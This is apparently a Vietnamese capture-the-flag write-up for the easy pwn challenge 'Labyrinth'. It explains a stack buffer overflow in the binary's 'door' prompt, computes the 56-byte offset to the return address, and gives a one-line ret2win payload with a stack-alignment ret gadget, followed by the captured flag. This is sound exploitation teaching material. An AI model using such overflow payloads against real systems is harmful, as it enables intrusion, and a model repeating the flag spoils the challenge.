# Labyrinth

## 1. Tổng quan

- **Loại:** pwn (binary exploitation)
- **Độ khó:** easy
- **Tác giả:** makelaris
- **Mô tả:** Bạn bị mắc kẹt trong mê cung, chỉ có một cơ hội thoát thân — chọn đúng cánh cửa.
- **Mục tiêu:** Vượt qua kiểm tra "cánh cửa", tràn stack và nhảy vào `escape_plan()` để in flag.

## 2. Thông tin instance

- **Target:** `154.57.164.71:32089` (TCP)
- File: `files/pwn_labyrinth.zip` (binary `labyrinth` không PIE, không canary, NX bật).

## 3. Phân tích binary

`main`:

```c
char *door = malloc(0x10);
fgets(door, 5, stdin);
if (strncmp(door, "69", 2) == 0 || strncmp(door, "069", 3) == 0) {
    puts("You are heading to open the door... Would you like to change the door you chose?\n\n>> ");
    char buf[48];                        // rbp-0x30
    fgets(buf, 0x44, stdin);             // <-- đọc 68 byte vào buffer 48 byte: overflow
}
puts("[-] YOU FAILED TO ESCAPE!");
```

Hàm win: `escape_plan()` tại `0x401255` — mở `./flag.txt` và in nội dung. Binary không PIE nên địa chỉ cố định. Offset đến saved RIP = `0x30 + 8 = 56`.

## 4. Khai thác

1. Gửi `"69"` để vượt qua kiểm tra cửa.
2. Gửi payload tràn: `b"A"*56 + p64(ret) + p64(0x401255)`.
   - **Lưu ý quan trọng:** `escape_plan()` được biên dịch để gọi qua `call` (khi vào hàm `rsp % 16 == 8`), nhưng ta vào bằng `ret` (`rsp % 16 == 0`) → stack lệch 8 byte. Hàm variadic `fprintf` bên trong `escape_plan` sẽ crash do misalignment. Giải pháp: chèn thêm một gadget `ret` (0x4010a0) trước địa chỉ win để đẩy `rsp` thêm 8, khôi phục alignment.

## 5. Kết quả

```
HTB{3sc4p3_fr0m_4b0v3}
```

## 6. Bài học

- Ret2win với PIE tắt là kỹ thuật cơ bản; cần tính offset buffer → RIP chính xác.
- **Stack alignment:** khi nhảy vào hàm bằng `ret` thay vì `call`, `rsp` lệch 8 byte so với giả định của trình biên dịch; các hàm variadic (`printf`/`fprintf`) dễ crash → thêm gadget `ret` ("ret sled") trước địa chỉ đích.
- Kiểm tra điều kiện rẽ nhánh của chương trình (cửa đúng `"69"`/`"069"`) trước khi chạm đến hàm nhạy cảm.
